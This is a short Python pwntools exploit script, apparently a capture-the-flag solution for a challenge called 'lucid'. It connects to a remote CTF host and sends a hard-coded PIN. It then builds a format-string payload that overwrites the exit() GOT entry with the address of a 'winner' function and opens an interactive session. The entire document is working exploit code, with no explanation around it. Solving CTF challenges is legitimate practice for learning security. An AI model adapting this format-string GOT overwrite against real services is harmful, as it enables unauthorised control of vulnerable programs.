from pwn import *
context.arch = 'i386'
io = remote('lucid.ctf.pragyan.org', 17030)
exe = ELF('./lucid')
io.recvuntil(b'pin:')
io.sendline(b'734694122449')
io.recvuntil(b'name:')
payload = fmtstr_payload(7, {exe.got['exit']:exe.sym['winner']})
io.sendline(payload)
io.interactive()